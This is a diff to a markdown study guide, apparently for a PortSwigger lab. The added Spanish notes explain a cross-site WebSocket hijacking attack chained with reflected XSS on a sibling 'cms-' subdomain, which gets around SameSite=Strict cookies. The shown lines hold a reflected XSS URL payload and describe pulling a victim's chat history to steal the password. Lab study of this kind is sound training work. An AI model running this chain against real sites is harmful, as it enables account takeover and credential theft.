@@ -2304,6 +2304,8 @@ csrf=TOKEN&username=administrator
   
 ### SameSite Strict bypass  
 
+1. `/chat` no usa token csrf así que es vulnerable a CSRF (víctima autenticada puede enviar solicitudes no deseadas al servidor en nombre del atacante, explotando la confianza del servidor en las cookies o tokens de sesión que el navegador de la víctima envía automáticamente).
+
 >In the live chat function, we notice the `GET /chat HTTP/2` request do not use any unpredictable tokens, this can ***identify*** possible  [cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) (CSWSH) vulnerability if possible to bypass [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) cookie restriction.  
 
 >Host on exploit server POC payload to ***identify*** CSWSH vulnerability.  
@@ -2320,7 +2322,14 @@ csrf=TOKEN&username=administrator
 </script>
 ```  
 
->The `SameSite=Strict` is set for session cookies and this prevent the browser from including these cookies in XSS cross-site requests. We ***Identify*** the header `Access-Control-Allow-Origin` in additional requests to script and images to a subdomain at `cms-`.  
+2. Si la política SameSite fuese `None`, con el payload anterior serviría porque se permite el envío de las cookies a cross domains. Sin embargo, la política es SameSite=`Strict` de tal forma que no se pueden enviar las cookies desde el dominio del exploit server a la web vulnerable.
+
+⚠️ Solamente se podría desde una web que estuviese en el mismo dominio que la web vulnerable tipo: `mail.vulnerablewebb.com` o similar.
+
+>The `SameSite=Strict` is set for session cookies and this prevent the browser from including these cookies in XSS cross-site requests. We ***Identify*** the header `Access-Control-Allow-Origin` in additional requests to script and images to a subdomain at `cms-`:
+
+![cms](images/cms.png)  
+
 >Browsing to this CDN subdomain at `cms-` and then ***identify*** that random user name input is reflected, confirmed this to be a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability.  
 
 ![cms reflected xss samesite bypass](images/cms-reflected-xss-samesite-bypass.png)  
@@ -2329,8 +2338,9 @@ csrf=TOKEN&username=administrator
 https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E&password=pass
 ```  
 
->Bypass the SameSite restrictions, by URL encode the entire script below and using it as the input to the CDN subdomain at `cms-` username login, hosted on exploit server.  
+⚠️ Descubrimos un dominio que sí podría enviar cookies a la web vulnerable (es un subdominio de ella) con un XSS (capacidad de ejecutar js). Lo tenemos todo. Montamos el ataque para que las peticiones para obtener el historial del chat tengan como emisor a la web `cms-`.
 
+>Bypass the SameSite restrictions, by URL encode the entire script below and using it as the input to the CDN subdomain at `cms-` username login, hosted on exploit server.  
 
 ```
 <script>
@@ -2355,6 +2365,12 @@ https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C
 >The chat history contain password for the victim.
 
 ![chat-history.png](images/chat-history.png)  
+
+Conclusiones:
+
+1. La víctima visita el exploit server y el script que ahí se encuentra hace que se emita la petición `"https://cms-TARGET.net/login?username=ENCODED-POC-CSWSH-SCRIPT&password=Peanut2019"`.
+2. La vulnerabilidad XSS de la web `cms-` hace que se ejecute la POC de JS que obtiene el historial de chats. Como estas peticiones parten de `cms-`, que es un subdominio de la web vulnerable, la política `SameSite` no salta y no hay problemas.
+3. Se obtiene el historial de chats, donde aparece la password del usuario. Se hace login y se ha obtenido su cuenta.
 
 [PortSwigger Lab: SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)  
 
